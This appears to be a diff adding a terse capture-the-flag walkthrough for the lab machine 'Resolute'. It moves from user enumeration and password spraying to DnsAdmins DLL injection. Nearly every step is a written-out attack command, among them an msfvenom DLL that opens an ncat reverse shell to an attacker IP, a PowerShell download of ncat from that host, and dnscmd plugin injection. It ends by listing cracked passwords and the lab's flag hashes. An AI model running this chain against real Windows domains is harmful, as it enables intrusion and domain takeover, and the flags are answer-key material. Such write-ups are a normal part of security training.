@@ -1,0 +1,28 @@
+Let's run enum4linux.
+We get a set of credentials and a lot of users.
+Try to login with marko and it doesn't work so let's use crackmapexec [ crackmapexec -u users -p passwords --shares 10.10.10.169 ]
+And we have a hit! [ MEGABANK\melanie:Welcome123! ] 
+Got the user! [ evil-winrm -i 10.10.10.169 -u melanie -p "Welcome123!" ]
+
+Heading to root.
+Searching throw dirs we get nothing. So let's look closer, using `dir -Force`
+Mapping throw dirs, we get to the `PSTranscripts`, and here is an interesting file, called `20191203/PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt` from which we get ryan's credentials!
+Now we got ryan! [ evil-winrm -i 10.10.10.169 -u ryan -p "Serv3r4Admin4cc123!" ]
+Running bloodhound-python from remote host we find that we are a domain administrator, member from DnsAdmin.
+Using that intel in mind, we can create a DLL injection in DNS service.
+First, we create the holly payload [ msfvenom -p windows/x64/exec cmd="C:\Windows\System32\spool\drivers\color\ncat.exe 10.10.14.47 1337 -e cmd.exe" -f dll > dnsCrash.dll ].
+Because we use ncat for reverse shell, we should simply download it [ (New-Object System.Net.WebClient).DownloadFile("http://10.10.14.47:8000/ncat.exe", "C:\Windows\System32\spool\drivers\color\ncat.exe") ]
+Than, find the domain name controller [ nltest /dclist: ]
+Having the payload and the tools on the box let's just inject the dll [ dnscmd \\Resolute /config /serverlevelplugindll \\10.10.14.47\zaBogdan\dnsCrash.dll ]
+And now restart the service [ cmd.exe /c "sc.exe \\Resolute stop dns && sc.exe \\Resolute start dns" ]
+Rooted.
+
+
+Users:
+-> melanie:Welcome123!
+-> ryan:Serv3r4Admin4cc123!
+
+Flags:
+-> USER: 0c3be45fcfe249796ccbee8d3a978540
+-> ROOT: e1d94876a506850d0c20edb5405e619c
+
